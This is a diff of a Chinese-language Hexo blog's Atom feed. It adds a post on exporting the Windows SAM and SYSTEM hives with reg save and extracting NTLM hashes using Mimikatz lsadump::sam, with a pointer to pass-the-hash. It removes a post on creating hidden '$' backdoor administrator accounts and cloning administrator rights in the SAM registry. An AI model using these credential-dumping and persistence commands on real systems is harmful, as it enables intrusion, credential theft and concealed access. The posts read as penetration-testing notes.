@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-02-01T13:23:06.711Z</updated>
+  <updated>2020-02-02T08:00:37.415Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH</title>
+    <link href="http://yoursite.com/2020/02/02/%E4%BD%BF%E7%94%A8Mimikatz%E8%AF%BB%E5%8F%96SAM%E5%92%8CSYSTEM%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84NTLM-HASH/"/>
+    <id>http://yoursite.com/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/</id>
+    <published>2020-02-02T07:39:51.000Z</published>
+    <updated>2020-02-02T08:00:37.415Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和SYSTEM文件，离线读取出NTML HASH，其实也可以用procdump64和mimikatz抓取Windows用户密码，这个小技巧算是另外一种方式吧</p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>首先导出两个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/1.png" alt><br>然后将这两个hive文件放到和Mimikatz同一个目录下，你可将目标机器的这两个文件拖出来到自己机器上尝试<br><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/2.png" alt><br>运行mimikatz，输入命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/ntlm.png" alt><br>获取NTML后，我们对其进行解密，就随便找个稍微好用的解密网站就行，这里用cmd5进行解密<br><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/123456.png" alt></p><p>解不出来，尝试hash传递吧！</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;使用场景&quot;&gt;&lt;a href=&quot;#使用场景&quot; class=&quot;headerlink&quot; title=&quot;使用场景&quot;&gt;&lt;/a&gt;使用场景&lt;/h1&gt;&lt;p&gt;已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和S
+      
+    
+    </summary>
+    
+    
+    
+      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>利用IPC进行横向渗透</title>
@@ -36,9 +60,9 @@
     
     
     
-      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
-    
       <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
@@ -442,27 +466,6 @@
     
     
       <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Windows下两个隐藏后门用户的小技巧</title>
-    <link href="http://yoursite.com/2019/11/06/Windows%E4%B8%8B%E4%B8%A4%E4%B8%AA%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
-    <id>http://yoursite.com/2019/11/06/Windows下两个隐藏后门用户的小技巧/</id>
-    <published>2019-11-06T12:20:56.000Z</published>
-    <updated>2020-01-13T04:49:20.596Z</updated>
-    
-    <content type="html"><![CDATA[<p>我们在渗透的过程中拿到权限之后想要植入后门(3389登陆)，net命令添加用户还是太明显了，无论是net user 或者登陆的时候都能看见我们创建的后门账号，今天碰巧看了篇实战文章，记录个留后门的小技巧<br><a id="more"></a></p><h1 id="用户后面添加"><a href="#用户后面添加" class="headerlink" title="用户后面添加$"></a>用户后面添加$</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">net user defaultuser0$ somepasswordhere /add /y</span><br><span class="line">net localgroup administrators defaultuser0$ /add</span><br><span class="line">net localgroup &quot;remote desktop users&quot; defaultuser0$ /add</span><br></pre></td></tr></table></figure><p>这样我们在net user的时候我们添加的用户就不会被显示出来了<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/user.png" alt><br>不过在登陆的时候这个账号还是显示出来了<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/login.png" alt></p><h1 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h1><p>regedit打开注册表，然后找到HKEY_LOCAL_MACHINE\SAM\SAM,右键点击权限，将读写权限赋予 administrator<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/sam.png" alt><br>重新打开注册表(这里不重新打开，sam目录下的内容无法展开)</p><p>将 administrator 对应目录中的F值复制到后门用户对应目录中的F值<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/f.png" alt><br>复制完成后，把 defaultuser0$ 和其对应的 0000003EC 目录导出并保存(这里不一定是3EC，具体你看你用户的类型)<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/export.png" alt><br>然后删除刚才的后门用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user defaultuser0$ /del</span><br></pre></td></tr></table></figure><p><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/login_2.png" alt><br>这里defaultuser0$就没有了</p><p>然后我们远程桌面连接，输入后门的账号密码就行了</p><p>不过据说这两种方法都不是很安全，还待后续挖掘更多的后门小技巧</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;我们在渗透的过程中拿到权限之后想要植入后门(3389登陆)，net命令添加用户还是太明显了，无论是net user 或者登陆的时候都能看见我们创建的后门账号，今天碰巧看了篇实战文章，记录个留后门的小技巧&lt;br&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="权限维持" scheme="http://yoursite.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
     
   </entry>
   
